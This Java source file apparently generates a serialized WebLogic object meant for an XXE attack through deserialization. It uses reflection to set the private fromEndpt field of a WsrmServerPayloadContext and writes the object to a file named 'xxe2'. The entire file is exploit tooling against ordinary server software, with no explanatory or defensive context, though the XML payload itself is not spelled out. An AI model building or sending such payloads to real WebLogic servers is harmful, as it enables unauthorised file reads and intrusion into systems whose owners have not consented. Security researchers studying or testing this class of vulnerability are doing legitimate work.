import weblogic.wsee.addressing.EndpointReference;
import weblogic.wsee.reliability.WsrmServerPayloadContext;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class weblogicxxe2 {
    public static void main(String[] args) throws IOException {
        Object instance = getXXEObject();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe2"));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static Object getXXEObject() {
        EndpointReference fromEndpt = (EndpointReference) new EndpointReference();
        WsrmServerPayloadContext wspc = new WsrmServerPayloadContext();
        try {
            Field f1 = wspc.getClass().getDeclaredField("fromEndpt");
            f1.setAccessible(true);
            f1.set(wspc, fromEndpt);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return wspc;
    }

}